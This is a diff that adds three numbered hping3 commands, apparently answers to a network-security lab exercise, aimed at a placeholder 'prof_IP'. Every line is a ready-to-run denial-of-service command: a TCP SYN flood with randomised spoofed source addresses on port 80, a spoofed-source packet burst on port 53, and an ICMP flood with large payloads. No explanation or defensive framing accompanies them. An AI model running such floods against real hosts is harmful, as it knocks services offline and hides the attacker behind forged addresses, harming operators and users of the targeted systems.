@@ -1,0 +1,14 @@
+1)
+
+hping3 -c 10000 -i u1 --rand-source prof_IP -p 80 -S
+
+
+2)
+
+hping3 -c 9000 -i u1000 -a spoofed_source -k -s 53 -p 53 -M 100 prof_IP
+
+
+
+3)
+
+hping3 -c 11000 -i u13 -d 1024 --icmp --flood prof_IP
